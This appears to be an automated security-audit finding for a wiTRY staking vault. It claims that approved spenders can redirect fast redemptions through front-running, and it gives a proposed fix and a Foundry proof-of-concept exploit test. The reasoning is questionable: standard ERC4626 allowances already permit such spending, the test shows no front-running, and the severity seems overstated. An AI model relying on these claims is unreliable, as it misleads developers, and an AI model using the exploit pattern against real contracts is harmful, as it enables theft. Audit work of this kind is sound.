## Title
Front-Running Vulnerability in Fast Redemption Allows Approved Addresses to Redirect User Assets

## Summary
The `fastRedeem()` function in `StakediTryFastRedeem.sol` allows any caller with approval to specify an arbitrary `receiver` address when redeeming shares on behalf of the owner. This enables a front-running attack where an attacker with approval (obtained through phishing or other means) can monitor the mempool for legitimate user redemption transactions and front-run them, redirecting the iTRY assets to the attacker's address instead of the user's intended destination. [1](#0-0) 

## Impact
**Severity**: High

## Finding Description
**Location:** `src/token/wiTRY/StakediTryFastRedeem.sol` - `fastRedeem()` function (lines 57-71) and `_redeemWithFee()` internal function (lines 138-156)

**Intended Logic:** The fast redemption feature allows users to bypass the cooldown period by paying a fee to immediately redeem their wiTRY shares for iTRY tokens. When a user has approved another address to spend their shares, that address should be able to execute the redemption on their behalf, with the assets going to the intended recipient.

**Actual Logic:** The function allows any approved caller to specify both the `owner` (whose shares to burn) and the `receiver` (where to send the redeemed assets) as separate parameters, with no validation that `receiver == owner` when `caller != owner`. The underlying ERC4626 `_withdraw` function checks the allowance but does not validate the receiver destination. [2](#0-1) 

**Exploitation Path:**
1. **Approval Acquisition**: Attacker obtains approval from victim through phishing (e.g., "Approve our dApp to access your wiTRY"), social engineering, or victim approving a contract for legitimate purposes
2. **Transaction Monitoring**: Victim submits transaction `fastRedeem(100 shares, victimAddress, victimAddress)` to redeem their shares to themselves
3. **Front-Running**: Attacker monitors mempool, detects victim's transaction, and front-runs with higher gas: `fastRedeem(100 shares, attackerAddress, victimAddress)` 
4. **Asset Theft**: Attacker's transaction executes first:
   - Burns 100 shares from victim's balance via allowance
   - Sends net iTRY assets (after fee) to attacker's address instead of victim's address
   - Victim's subsequent transaction reverts due to insufficient shares or processes remaining shares incorrectly [3](#0-2) 

**Security Property Broken:** This vulnerability violates the fundamental expectation that users control the destination of their own assets during redemption operations. It allows unauthorized redirection of funds to arbitrary addresses when approval exists, enabling direct theft of user funds.

## Impact Explanation
- **Affected Assets**: iTRY tokens (the underlying asset in the wiTRY vault) redeemed through fast redemption
- **Damage Severity**: An attacker with approval can steal 100% of the approved share amount by redirecting the redeemed iTRY tokens to their own address. For example, if a user has 1000 wiTRY shares worth 1000 iTRY and has given approval, the attacker can front-run their redemption and steal all 1000 iTRY (minus the fast redemption fee which goes to treasury).
- **User Impact**: Any user who has granted approval to another address (whether through phishing, for a legitimate dApp interaction, or for cross-chain operations) is vulnerable. The attack is triggered when the victim attempts to redeem their shares, making it time-sensitive and exploitable during the victim's own transaction.

## Likelihood Explanation
- **Attacker Profile**: Any address that has obtained approval from a victim, including phishing attackers, malicious dApp contracts, or compromised contracts that users previously trusted
- **Preconditions**: 
  - Victim must have granted approval to attacker for at least the amount of shares being redeemed
  - Fast redemption must be enabled (`fastRedeemEnabled == true`)
  - Cooldown must be enabled (`cooldownDuration > 0`)
  - Victim must initiate a fast redemption transaction
- **Execution Complexity**: Single transaction front-running attack. The attacker needs to monitor the mempool for victim transactions and submit their own transaction with higher gas to ensure it executes first. This is a well-known MEV technique readily available through flashbot relays and other MEV infrastructure.
- **Frequency**: Can be exploited every time the victim attempts to redeem while approval exists. The attacker can drain the full approved amount in a single transaction, or repeatedly front-run multiple redemption attempts if the approval is large enough.

## Recommendation

Add validation to ensure that when `caller != owner`, the `receiver` must be the `owner`. This prevents approved addresses from redirecting assets to arbitrary destinations: [1](#0-0) 

```solidity
// In src/token/wiTRY/StakediTryFastRedeem.sol, function fastRedeem, line 57:

// CURRENT (vulnerable):
function fastRedeem(uint256 shares, address receiver, address owner)
    external
    ensureCooldownOn
    ensureFastRedeemEnabled
    returns (uint256 assets)
{
    if (shares > maxRedeem(owner)) revert ExcessiveRedeemAmount();

    uint256 totalAssets = previewRedeem(shares);
    uint256 feeAssets = _redeemWithFee(shares, totalAssets, receiver, owner);

    emit FastRedeemed(owner, receiver, shares, totalAssets, feeAssets);

    return totalAssets - feeAssets;
}

// FIXED:
function fastRedeem(uint256 shares, address receiver, address owner)
    external
    ensureCooldownOn
    ensureFastRedeemEnabled
    returns (uint256 assets)
{
    if (shares > maxRedeem(owner)) revert ExcessiveRedeemAmount();
    
    // Prevent approved addresses from redirecting assets to arbitrary receivers
    if (msg.sender != owner && receiver != owner) {
        revert InvalidReceiver();
    }

    uint256 totalAssets = previewRedeem(shares);
    uint256 feeAssets = _redeemWithFee(shares, totalAssets, receiver, owner);

    emit FastRedeemed(owner, receiver, shares, totalAssets, feeAssets);

    return totalAssets - feeAssets;
}
```

Apply the same fix to `fastWithdraw()` function: [4](#0-3) 

Alternative mitigations:
1. **Remove receiver parameter when caller != owner**: Force receiver to always be the owner when using allowance
2. **Add deadline parameter**: Include a deadline timestamp to prevent front-running attacks from being profitable after a certain time
3. **Add signature verification**: Require the owner to sign a message explicitly approving the specific receiver address for each redemption

## Proof of Concept

```solidity
// File: test/Exploit_FastRedeemFrontRun.t.sol
// Run with: forge test --match-test test_FastRedeemFrontRunAttack -vvv

pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/token/wiTRY/StakediTryFastRedeem.sol";
import "../src/token/iTRY/iTry.sol";

contract Exploit_FastRedeemFrontRun is Test {
    StakediTryFastRedeem stakediTry;
    iTry iTryToken;
    
    address admin = address(1);
    address victim = address(2);
    address attacker = address(3);
    address treasury = address(4);
    address rewarder = address(5);
    
    function setUp() public {
        // Deploy iTRY token
        vm.prank(admin);
        iTryToken = new iTry(admin);
        
        // Deploy StakediTryFastRedeem
        vm.prank(admin);
        stakediTry = new StakediTryFastRedeem(
            IERC20(address(iTryToken)),
            rewarder,
            admin,
            treasury
        );
        
        // Enable fast redeem
        vm.startPrank(admin);
        stakediTry.setFastRedeemEnabled(true);
        stakediTry.setFastRedeemFee(500); // 5% fee
        stakediTry.setCooldownDuration(7 days);
        vm.stopPrank();
        
        // Setup victim with iTRY and wiTRY shares
        vm.startPrank(admin);
        iTryToken.mint(victim, 1000e18);
        vm.stopPrank();
        
        vm.startPrank(victim);
        iTryToken.approve(address(stakediTry), 1000e18);
        stakediTry.deposit(1000e18, victim);
        vm.stopPrank();
    }
    
    function test_FastRedeemFrontRunAttack() public {
        // SETUP: Victim has 1000 wiTRY shares
        uint256 victimShares = stakediTry.balanceOf(victim);
        assertEq(victimShares, 1000e18, "Victim should have 1000 shares");
        
        // Victim approves attacker (e.g., via phishing)
        vm.prank(victim);
        stakediTry.approve(attacker, victimShares);
        
        uint256 victimITryBefore = iTryToken.balanceOf(victim);
        uint256 attackerITryBefore = iTryToken.balanceOf(attacker);
        
        // EXPLOIT: Victim intends to fast redeem to themselves
        // But attacker front-runs and redirects to attacker's address
        vm.prank(attacker);
        uint256 attackerReceivedAssets = stakediTry.fastRedeem(
            victimShares,
            attacker,  // Attacker specifies their own address as receiver
            victim     // But victim is the owner whose shares get burned
        );
        
        // VERIFY: Attacker received the iTRY, not the victim
        uint256 victimITryAfter = iTryToken.balanceOf(victim);
        uint256 attackerITryAfter = iTryToken.balanceOf(attacker);
        
        assertEq(victimITryAfter, victimITryBefore, "Victim received no iTRY");
        assertGt(attackerITryAfter, attackerITryBefore, "Attacker stole iTRY");
        assertEq(stakediTry.balanceOf(victim), 0, "Victim's shares were burned");
        assertEq(attackerReceivedAssets, attackerITryAfter - attackerITryBefore, 
            "Vulnerability confirmed: Attacker redirected victim's redemption to themselves");
    }
}
```

## Notes

This vulnerability is distinct from the known issue about blacklisted users transferring via allowance. While both involve allowance exploitation, this issue specifically concerns **asset redirection during redemption operations**, allowing direct theft of redeemed assets through front-running, not just transfer of shares.

The root cause is that the ERC4626 standard's flexibility in allowing separate `receiver` and `owner` parameters creates an attack surface when combined with the approval mechanism and front-running opportunities. While this design is intentional in ERC4626 for legitimate use cases (e.g., redeeming on behalf of someone to a third-party address), it becomes a security vulnerability in the context of:
1. Approvals obtained through phishing
2. Front-running capabilities in public mempools
3. Lack of additional protections (deadlines, receiver validation)

The same vulnerability exists in the `fastWithdraw()` function and should be addressed with the same mitigation.

### Citations

**File:** src/token/wiTRY/StakediTryFastRedeem.sol (L57-71)
```text
    function fastRedeem(uint256 shares, address receiver, address owner)
        external
        ensureCooldownOn
        ensureFastRedeemEnabled
        returns (uint256 assets)
    {
        if (shares > maxRedeem(owner)) revert ExcessiveRedeemAmount();

        uint256 totalAssets = previewRedeem(shares);
        uint256 feeAssets = _redeemWithFee(shares, totalAssets, receiver, owner);

        emit FastRedeemed(owner, receiver, shares, totalAssets, feeAssets);

        return totalAssets - feeAssets;
    }
```

**File:** src/token/wiTRY/StakediTryFastRedeem.sol (L76-90)
```text
    function fastWithdraw(uint256 assets, address receiver, address owner)
        external
        ensureCooldownOn
        ensureFastRedeemEnabled
        returns (uint256 shares)
    {
        if (assets > maxWithdraw(owner)) revert ExcessiveWithdrawAmount();

        uint256 totalShares = previewWithdraw(assets);
        uint256 feeAssets = _redeemWithFee(totalShares, assets, receiver, owner);

        emit FastRedeemed(owner, receiver, totalShares, assets, feeAssets);

        return totalShares;
    }
```

**File:** src/token/wiTRY/StakediTryFastRedeem.sol (L138-156)
```text
    function _redeemWithFee(uint256 shares, uint256 assets, address receiver, address owner)
        internal
        returns (uint256 feeAssets)
    {
        feeAssets = (assets * fastRedeemFeeInBPS) / BASIS_POINTS;

        // Enforce that fast redemption always has a cost
        if (feeAssets == 0) revert InvalidAmount();

        uint256 feeShares = previewWithdraw(feeAssets);
        uint256 netShares = shares - feeShares;
        uint256 netAssets = assets - feeAssets;

        // Withdraw fee portion to treasury
        _withdraw(_msgSender(), fastRedeemTreasury, owner, feeAssets, feeShares);

        // Withdraw net portion to receiver
        _withdraw(_msgSender(), receiver, owner, netAssets, netShares);
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L262-278)
```text
    function _withdraw(address caller, address receiver, address _owner, uint256 assets, uint256 shares)
        internal
        override
        nonReentrant
        notZero(assets)
        notZero(shares)
    {
        if (
            hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)
                || hasRole(FULL_RESTRICTED_STAKER_ROLE, _owner)
        ) {
            revert OperationNotAllowed();
        }

        super._withdraw(caller, receiver, _owner, assets, shares);
        _checkMinShares();
    }
```
